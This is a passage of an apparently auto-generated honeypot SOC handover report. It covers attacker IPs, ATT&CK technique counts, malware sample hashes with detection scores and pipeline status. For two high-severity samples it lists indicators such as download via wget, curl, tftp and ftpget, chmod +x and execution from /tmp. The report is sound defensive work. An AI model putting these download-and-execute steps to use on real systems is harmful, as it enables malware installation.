| `178.158.228[.]82` | 1 | 2026-08-14 06:58 | 2026-08-14 06:58 | 15s | 0 | `T1592` | 🟢 LOW |
| `180.76.52[.]146` | 1 | 2026-08-14 07:33 | 2026-08-14 07:33 | 7s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]102` | 1 | 2026-08-14 07:40 | 2026-08-14 07:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `222.134.147[.]66` | 1 | 2026-08-14 08:46 | 2026-08-14 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.226.37[.]33` | 1 | 2026-08-14 08:45 | 2026-08-14 08:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.165.62[.]70` | 1 | 2026-08-14 07:07 | 2026-08-14 07:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-08-14 07:42 | 2026-08-14 07:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.65.234[.]130` | 1 | 2026-08-14 07:27 | 2026-08-14 07:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-14 08:40 | 2026-08-14 08:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-08-14 08:37 | 2026-08-14 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.191.176[.]93` | 1 | 2026-08-14 07:23 | 2026-08-14 07:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-08-14 06:59 | 2026-08-14 07:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]53` | 1 | 2026-08-14 07:06 | 2026-08-14 07:06 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `195.222.57[.]190` | BA | Public Enterprise BH Telecom DD | **100** ⚠️ | 50 |
| `43.226.37[.]33` | CN | Shenzhen Qianhai bird cloud computing Co. Ltd. | **100** ⚠️ | 29 |
| `114.33.12[.]13` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 50 |
| `121.22.99[.]2` | CN | China Unicom Hebei province network | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `121.189.198[.]60` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `78.189.17[.]35` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 50 |
| `113.108.88[.]121` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `181.212.174[.]164` | CL | TELEFONICA EMPRESAS CHILE SA | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 154 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 137 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 214 cases |
| Tool 34  | Credential Extractor        | ✅ 157 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 87 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (12.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 65 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 136 priority case(s) shown individually · 29 recon entry/entries in table (9 group(s) consolidating 32 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-14T09:13:15Z_
